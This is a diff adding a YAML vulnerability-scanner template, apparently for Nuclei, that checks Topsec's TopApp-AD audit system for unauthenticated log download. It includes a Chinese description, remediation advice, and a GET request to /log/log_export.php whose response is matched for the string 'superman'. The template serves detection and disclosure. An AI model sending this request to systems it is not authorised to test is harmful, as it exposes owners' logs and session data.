@@ -1,0 +1,28 @@
+id: SecurityCheckerSys-Unauth-DownloadLogs
+info:
+  name: 天融信网络卫士安全审计系统未授权日志下载
+  author:
+  - l0ne1y
+  description: |-
+    天融信网络卫士安全审计系统未授权日志下载漏洞
+    天融信TopApp-AD存在未授权访问漏洞，攻击者可以利用该漏洞下载系统日志进而获取到系统信息。
+  severity: medium
+  remediation: |
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    https://www.topsec.com.cn/
+
+    临时修复方案：
+    1、前后端同时对用户输入信息进行校验，双重验证机制。
+    2、调用功能前验证用户是否有权限调用相关功能。
+    3、禁止在日志中记录明文的敏感数据：禁止在日志中记录明文的敏感数据（如口
+    令、会话标识jsessionid等）， 防止敏感信息泄漏。
+requests:
+- matchers:
+  - type: dsl
+    dsl:
+    - ' contains(body,"superman") && status_code==200 '
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/log/log_export.php'
+  method: GET
